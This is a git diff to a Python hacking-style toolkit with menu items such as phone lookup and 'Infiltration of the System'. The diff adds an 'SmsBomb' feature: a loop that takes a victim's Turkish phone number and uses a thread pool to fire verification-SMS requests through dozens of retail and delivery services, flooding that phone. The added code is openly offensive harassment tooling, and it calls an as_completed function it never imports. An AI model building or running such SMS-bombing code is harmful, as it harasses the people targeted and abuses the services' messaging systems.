@@ -19,7 +19,14 @@ import time
 import requests
 import json
 import sys
-
+from colorama import Fore, Style
+from time import sleep
+from os import system
+from sms import SendSms
+from concurrent.futures import ThreadPoolExecutor, wait
+import sys
+import os
+from getpass import getpass
 from datetime import datetime
 from colorama import Fore, init
 from pystyle import *
@@ -119,7 +126,8 @@ def main_menu():
         Write.Print("[3] Phone Lookup\n", Colors.red_to_black, interval=0.03)
         Write.Print("[4] Infiltration of the System\n", Colors.red_to_black, interval=0.03)
         Write.Print("[5] Token Info\n", Colors.red_to_black, interval=0.03)
-        Write.Print("[6] Exit\n\n", Colors.red_to_black, interval=0.03)
+        Write.Print("[6] SmsBomb\n", Colors.red_to_black, interval=0.03)
+        Write.Print("[7] Exit\n\n", Colors.red_to_black, interval=0.03)
 
         choice = Write.Input("[+] Enter Your Choice: ", Colors.red_to_white, interval=0.04) 
         if choice == '1':
@@ -140,12 +148,217 @@ def main_menu():
             token_info()
 
         elif choice == '6':
+            cls()
+            sms_bomb()
+
+        elif choice == '7':
             print("Exiting...")
             sys.exit()
 
         else:
             print("Invalid choice. Please try again.")
             time.sleep(1)
+
+
+def sms_bomb():
+    servisler_sms = []
+    for attribute in dir(SendSms):
+        attribute_value = getattr(SendSms, attribute)
+        if callable(attribute_value) and not attribute.startswith('__'):
+            servisler_sms.append(attribute)
+
+    while True:
+        system("cls||clear")
+        banner = """
+  ██████  ███▄ ▄███▓  ██████     ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   
+▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
+░ ▓██▄   ▓██    ▓██░░ ▓██▄      ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██
+  ▒   ██▒▒██    ▒██   ▒   ██▒   ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  
+▒██████▒▒▒██▒   ░██▒▒██████▒▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
+▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
+░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
+░  ░  ░  ░      ░   ░  ░  ░      ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░ 
+      ░         ░         ░      ░          ░ ░         ░    ░      
+                                      ░                           ░   
+        ╔══════════════════════════════════════════════╗
+        ║                 SMS-BOMBER                   ║
+        ║              Coded By manig.as               ║
+        ║              Discord: manig.as               ║
+        ╚══════════════════════════════════════════════╝  
+        """
+        colored_banner = Colorate.Horizontal(Colors.red_to_black, Center.XCenter(banner))
+        print(colored_banner)
+
+        try:
+            menu = Write.Input("[1] Send Sms\n[2] Refresh\n[3] Exit\n\n Seçim: ", Colors.red_to_black, interval=0.03)
+        
+            if menu == "":
+                continue
+            menu = int(menu) 
+        except ValueError:
+            system("cls||clear")
+            Write.Print("HATA! LÜTFEN TEKRAR DENEYİNİZ\n\n", Colors.red_to_black, interval=0.03)
+            sleep(3)
+            continue
+        
+        if menu == 1:
+            system("cls||clear")
+            Write.Print("TELEFON NUMARASININI YAZINIZ: ", Colors.red_to_black, interval=0.03)
+            tel_no = input()
+            Write.Print("NOT:MAX 100 ADET YOLLAR", Colors.red_to_black, interval=0.03)
+            time.sleep(2)
+            try:
+                int(tel_no)
+                if len(tel_no) != 10:
+                    raise ValueError
+            except ValueError:
+                system("cls||clear")
+                Write.Print("HATA! LÜTFEN TEKRAR DENEYİNİZ\n\n", Colors.red_to_black, interval=0.03)
+                sleep(3)
+                continue
+            system("cls||clear")
+            send_sms = SendSms(tel_no)
+            try:
+                while True:
+                    with ThreadPoolExecutor() as executor:
+                        futures = [
+                        executor.submit(send_sms.TiklaGelsin),
+                        executor.submit(send_sms.Akasya),
+                        executor.submit(send_sms.Akbati),
+                        executor.submit(send_sms.Ayyildiz),
+                        executor.submit(send_sms.Baydoner),
+                        executor.submit(send_sms.Beefull),
+                        executor.submit(send_sms.Bim),
+                        executor.submit(send_sms.Bisu),
+                        executor.submit(send_sms.Bodrum),
+                        executor.submit(send_sms.Clickme),
+                        executor.submit(send_sms.Dominos),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Hizliecza),
+                        executor.submit(send_sms.Icq),
+                        executor.submit(send_sms.Ipragaz),
+                        executor.submit(send_sms.Istegelsin),
+                        executor.submit(send_sms.Joker),
+                        executor.submit(send_sms.KahveDunyasi),
+                        executor.submit(send_sms.KimGb),
+                        executor.submit(send_sms.Komagene),
+                        executor.submit(send_sms.Koton),
+                        executor.submit(send_sms.KuryemGelsin),
+                        executor.submit(send_sms.Macro),
+                        executor.submit(send_sms.Metro),
+                        executor.submit(send_sms.Migros),
+                        executor.submit(send_sms.Naosstars),
+                        executor.submit(send_sms.Paybol),
+                        executor.submit(send_sms.Pidem),
+                        executor.submit(send_sms.Porty),
+                        executor.submit(send_sms.Qumpara),
+                        executor.submit(send_sms.Starbucks),
+                        executor.submit(send_sms.Suiste),
+                        executor.submit(send_sms.Taksim),
+                        executor.submit(send_sms.Tasdelen),
+                        executor.submit(send_sms.Tasimacim),
+                        executor.submit(send_sms.Tazi),
+                        executor.submit(send_sms.TiklaGelsin),
+                        executor.submit(send_sms.ToptanTeslim),
+                        executor.submit(send_sms.Ucdortbes),
+                        executor.submit(send_sms.Uysal),
+                        executor.submit(send_sms.Wmf),
+                        executor.submit(send_sms.Yapp),
+                        executor.submit(send_sms.YilmazTicaret),
+                        executor.submit(send_sms.Yuffi),
+                        executor.submit(send_sms.Akasya),
+                        executor.submit(send_sms.Akbati),
+                        executor.submit(send_sms.Ayyildiz),
+                        executor.submit(send_sms.Baydoner),
+                        executor.submit(send_sms.Beefull),
+                        executor.submit(send_sms.Bim),
+                        executor.submit(send_sms.Bisu),
+                        executor.submit(send_sms.Bodrum),
+                        executor.submit(send_sms.Clickme),
+                        executor.submit(send_sms.Dominos),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        executor.submit(send_sms.Hey),
+                        executor.submit(send_sms.Englishhome),
+                        executor.submit(send_sms.Evidea),
+                        executor.submit(send_sms.File),
+                        executor.submit(send_sms.Frink),
+                        executor.submit(send_sms.Happy),
+                        executor.submit(send_sms.Hayatsu),
+                        ]
+                        for future in as_completed(futures):
+                            pass
+                        Write.Input("Press Enter to continue...\n", Colors.green_to_black, interval=0.07)
+                        sms_bomb()
+            except Exception as e:
+                print(Fore.LIGHTRED_EX + f"Bir hata oluştu: {e}" + Style.RESET_ALL)
+                continue
+        elif menu == 2:
+            pass  # Buraya menüyü yenileme işlemini ekle
+        else:
+            print(Fore.LIGHTRED_EX + "Geçersiz seçim!" + Style.RESET_ALL)
+            sleep(3)
+            continue
 
 def ip_info_lookup():
     banner = """
